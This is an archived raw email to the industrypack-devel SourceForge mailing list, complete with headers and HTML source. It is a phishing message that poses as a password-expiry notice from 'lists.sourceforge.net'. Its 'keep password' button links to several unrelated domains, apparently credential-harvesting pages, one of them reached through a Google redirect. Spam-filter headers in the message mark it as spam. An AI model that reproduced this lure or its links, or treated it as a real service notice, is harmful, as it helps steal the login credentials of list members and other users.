Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id CE221B10863
	for <lists+industrypack-devel@lfdr.de>; Thu, 24 Jul 2025 13:01:48 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=IHKROWwBjguhGIXCHxGrwy5iWfLy47F9et66HtlHYoA=; b=ZkDVyjp9Q+uK8RqKUsQBV3umvk
	9Pv7Q3VigbkUZezVos9bEvHiCdTZK+tOBmWweHhhbhuCiz20DHY519/4+GxlkrqizgfZIPM1fnrEA
	VV5jH5gzgPO8T1TFQWNhvhezFdkgUCkUeflJgfQUp4AbnktOG2YHrFfnDpQE+MyQjt+E=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1uethq-0006Mq-Iu
	for lists+industrypack-devel@lfdr.de;
	Thu, 24 Jul 2025 11:01:46 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <overseas@kikusui.co.jp>) id 1uethp-0006Mk-JA
 for industrypack-devel@lists.sourceforge.net;
 Thu, 24 Jul 2025 11:01:45 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=hhCQqrSRn1XgpEqKs+C+Uxxu8XxGyuWcoj2nCu9csSc=; b=Bbm9UHsDywqDAUM1ydccNZght2
 ZN2GTSzbDDUH07ikeKYz+DMKg8XZ9So3Q6eXsIPKzsBtMTUoaAm3UmHuXSgnEdf++w0mFPJZHAHWl
 7OGMXnAlbmz3TILPDVLMCb564joYzQiVcMNdvR+Uc4yARvbxBJwm2v0U9UeGqK/BUYeo=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=hhCQqrSRn1XgpEqKs+C+Uxxu8XxGyuWcoj2nCu9csSc=; b=M
 paSjV/vWZ0HDkWc2XdBM9fQiv2C9eLykTIx2orsII056Jt0DMzjxpNoc/zurauskAe6Qoa+yhgzBP
 1SrgR3pTwaaiX7QhG4ZViFAYLd7O571jSrFFDwsHz90pkcXDjQMyU4tq7WiXosXZb55k/TyZIASUS
 zcQNoOEKXOOEGT90=;
Received: from [188.127.225.17] (helo=amusend.net)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1uetho-0007qr-Qw for industrypack-devel@lists.sourceforge.net;
 Thu, 24 Jul 2025 11:01:45 +0000
Received: from kikusui.co.jp (localhost [IPv6:::1])
 by amusend.net (Postfix) with ESMTP id 858D290CE77
 for <industrypack-devel@lists.sourceforge.net>;
 Thu, 24 Jul 2025 13:36:54 +0300 (MSK)
From: lists.sourceforge.net  <overseas@kikusui.co.jp>
To: industrypack-devel@lists.sourceforge.net
Date: 24 Jul 2025 03:36:54 -0700
Message-ID: <20250724033654.B781C8675F1C2979@kikusui.co.jp>
MIME-Version: 1.0
X-Spam-Score: 6.7 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Dear industrypack-devel The password for
 industrypack-devel@lists.sourceforge.net
 expires on 7/24/2025 3:36:54 a.m. Please use the button below to continue
 with the current password 
 Content analysis details:   (6.7 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 4.0 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
 [Blocked - see <https://www.spamcop.net/bl.shtml?188.127.225.17>]
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 GOOG_REDIR_HTML_ONLY   Google redirect to obscure spamvertised website
 + HTML only
 0.4 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
 0.0 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised website +
 no rDNS
 0.0 PDS_FRNOM_TODOM_DBL_URL From Name to domain, double URL
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
 0.9 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1uetho-0007qr-Qw
Subject: [Industrypack-devel] [SPAM] Password Update Notififcation !!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============2909189908941499790=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2909189908941499790==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body style=3D"MARGIN: 0.5em">
<DIV style=3D'BORDER-LEFT-WIDTH: 0px; FONT-SIZE: small; FONT-FAMILY: "ys te=
xt", arial, sans-serif, serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL=
-ALIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACI=
NG: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); PADD=
ING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 0px; =
PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norm=
al; LINE-HEIGHT: normal; PADDING-RIGHT: 0px;=20
BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial; font-variant-numeric: inherit; f=
ont-variant-east-asian: inherit; font-variant-alternates: inherit; font-str=
etch: inherit; font-size-adjust: inherit; font-kerning: inherit; font-featu=
re-settings: inherit'><FONT size=3D2>
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: arial, sans-serif, seri=
f, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOT=
TOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; M=
ARGIN: 0px; LINE-HEIGHT: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px;=
 font-stretch: inherit; font-size-adjust: inherit; font-kerning: inherit; f=
ont-feature-settings: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FON=
T style=3D"VERTICAL-ALIGN: inherit">
Dear industrypack-devel</FONT></FONT></SPAN></FONT><BR>&nbsp;</DIV>
<DIV style=3D'BORDER-LEFT-WIDTH: 0px; FONT-SIZE: small; FONT-FAMILY: "ys te=
xt", arial, sans-serif, serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL=
-ALIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACI=
NG: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); PADD=
ING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 0px; =
PADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norm=
al; LINE-HEIGHT: normal; PADDING-RIGHT: 0px;=20
BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial; font-variant-numeric: inherit; f=
ont-variant-east-asian: inherit; font-variant-alternates: inherit; font-str=
etch: inherit; font-size-adjust: inherit; font-kerning: inherit; font-featu=
re-settings: inherit'><FONT size=3D+0>
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-RIGHT-W=
IDTH: 0px; VERTICAL-ALIGN: inherit; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTO=
M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: norm=
al; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font-=
size-adjust: inherit; font-kerning: inherit; font-feature-settings: inherit=
">
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: arial, sans-serif, seri=
f, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: inherit; BORDER-BOTT=
OM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MA=
RGIN: 0px; LINE-HEIGHT: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; =
font-stretch: inherit; font-size-adjust: inherit; font-kerning: inherit; fo=
nt-feature-settings: inherit">
&nbsp; &nbsp;The password for&nbsp;industrypack-devel@lists.sourceforge.net=
&nbsp; expires&nbsp;on<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-W=
IDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTT=
OM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0=
px; BORDER-TOP-WIDTH: 0px">&nbsp;</SPAN>&nbsp;<FONT color=3D#eb3b14><SPAN>&=
nbsp;</SPAN>
 <SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; FONT-FAMILY: inher=
it; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH:=
 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px=
; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font-si=
ze-adjust: inherit; font-kerning: inherit; font-feature-settings: inherit">=
7/24/2025 3:36:54 a.m.</SPAN></FONT></SPAN></SPAN><BR style=3D"LINE-HEIGHT:=
 normal"><BR style=3D"LINE-HEIGHT: normal">
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: small; FONT-FAMILY: arial=
, sans-serif, serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: in=
herit; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PAD=
DING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: normal; PADDING-RIGHT: 0px; BORDE=
R-TOP-WIDTH: 0px; font-stretch: inherit; font-size-adjust: inherit; font-ke=
rning: inherit; font-feature-settings: inherit">
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-RIGHT-W=
IDTH: 0px; VERTICAL-ALIGN: inherit; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTO=
M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: norm=
al; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font-=
size-adjust: inherit; font-kerning: inherit; font-feature-settings: inherit=
">
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Please use t=
he button below to continue with the current password</SPAN><SPAN>&nbsp;</S=
PAN>
 &nbsp;<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-=
RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDI=
NG-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIG=
HT: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inheri=
t; font-size-adjust: inherit; font-kerning: inherit; font-feature-settings:=
 inherit">&nbsp;</SPAN><SPAN>&nbsp;</SPAN>
 <SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-RIGHT-=
WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOT=
TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: no=
rmal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; fon=
t-size-adjust: inherit; font-kerning: inherit; font-feature-settings: inher=
it">&nbsp;</SPAN><SPAN>&nbsp;</SPAN>
 &nbsp;<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-=
RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; PADDI=
NG-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIG=
HT: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inheri=
t; font-size-adjust: inherit; font-kerning: inherit; font-feature-settings:=
 inherit">&nbsp;&nbsp;</SPAN><SPAN>&nbsp;</SPAN>
 &nbsp;<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-=
RIGHT-WIDTH: 0px; VERTICAL-ALIGN: inherit; BORDER-BOTTOM-WIDTH: 0px; PADDIN=
G-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGH=
T: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit=
; font-size-adjust: inherit; font-kerning: inherit; font-feature-settings: =
inherit">&nbsp;<BR>&nbsp;</SPAN></SPAN></FONT></DIV>
<DIV style=3D'BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 16px; FONT-FAMILY: "ys tex=
t", arial, sans-serif, serif, EmojiFont; BORDER-RIGHT-WIDTH: 0px; VERTICAL-=
ALIGN: baseline; WHITE-SPACE: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACIN=
G: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); PADDI=
NG-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TOP: 0px; P=
ADDING-LEFT: 0px; MARGIN: 0px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: norma=
l; LINE-HEIGHT: normal; PADDING-RIGHT: 0px;=20
BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial; font-variant-numeric: inherit; f=
ont-variant-east-asian: inherit; font-variant-alternates: inherit; font-str=
etch: inherit; font-size-adjust: inherit; font-kerning: inherit; font-featu=
re-settings: inherit'>
<P style=3D"FONT-SIZE: 14px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
-LEFT: 0px; MARGIN: 1em 0px; LINE-HEIGHT: normal; PADDING-RIGHT: 0px">
<A title=3Dhttps://olc.oraclesoftruth.org/wp-includes/l10n/@/app/?client-re=
quest-id=3Dclintonleo180@hotmail.com style=3D"BORDER-LEFT-WIDTH: 0px; FONT-=
SIZE: 16px; FONT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0px; WIDTH: 290px; VE=
RTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; FONT-WEIGHT: bolder; COLO=
R: rgb(248,248,248); PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT:=
 10px; MARGIN: 0px auto; LINE-HEIGHT: normal; PADDING-RIGHT: 10px; BORDER-T=
OP-WIDTH: 0px; BACKGROUND-COLOR: rgb(0,0,0);=20
text-decoration-line: none; font-stretch: inherit; font-size-adjust: inheri=
t; font-kerning: inherit; font-feature-settings: inherit" href=3D"https://t=
hymora.mypi.co/legit/app/?client-request-id=3Dindustrypack-devel@lists.sour=
ceforge.net" rel=3D"noopener noreferrer" target=3D_blank data-saferedirectu=
rl=3D"https://www.google.com/url?q=3Dhttps://beijbecssa.mypi.co/mail/mail/u=
pd/Afo/?%3Dclient-request-id%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;u=
st=3D1752671493968000&amp;usg=3DAOvVaw3ZBE6xShjL2iwpPlPu3dHY">keep password=
</A></P>
<DIV aria-hidden=3Dtrue style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; F=
ONT-FAMILY: inherit; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BOR=
DER-BOTTOM-WIDTH: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
 0px; MARGIN: 0px; LINE-HEIGHT: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDT=
H: 0px; font-stretch: inherit; font-size-adjust: inherit; font-kerning: inh=
erit; font-feature-settings: inherit">&nbsp;</DIV>
<DIV style=3D"BORDER-LEFT-WIDTH: 0px; FONT-SIZE: 14px; FONT-FAMILY: inherit=
; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0=
px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; =
LINE-HEIGHT: normal; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretc=
h: inherit; font-size-adjust: inherit; font-kerning: inherit; font-feature-=
settings: inherit"><FONT style=3D"FONT-FAMILY: arial, sans-serif" size=3D2>=

<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-RIGHT-W=
IDTH: 0px; VERTICAL-ALIGN: inherit; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTO=
M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: norm=
al; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font-=
size-adjust: inherit; font-kerning: inherit; font-feature-settings: inherit=
">
<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: inherit; BORDER-RIGHT-W=
IDTH: 0px; VERTICAL-ALIGN: inherit; BORDER-BOTTOM-WIDTH: 0px; PADDING-BOTTO=
M: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: norm=
al; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; font-stretch: inherit; font-=
size-adjust: inherit; font-kerning: inherit; font-feature-settings: inherit=
">lists.sourceforge.net&nbsp;</SPAN></SPAN><SPAN>&nbsp;</SPAN>
 &nbsp;<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERT=
ICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(17,17,17); PADDI=
NG-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-R=
IGHT: 0px; BORDER-TOP-WIDTH: 0px"><FONT style=3D"VERTICAL-ALIGN: inherit"><=
FONT style=3D"VERTICAL-ALIGN: inherit">&nbsp;(c)2025</FONT></FONT></SPAN></=
FONT></DIV></DIV></BODY></HTML>


--===============2909189908941499790==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2909189908941499790==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2909189908941499790==--
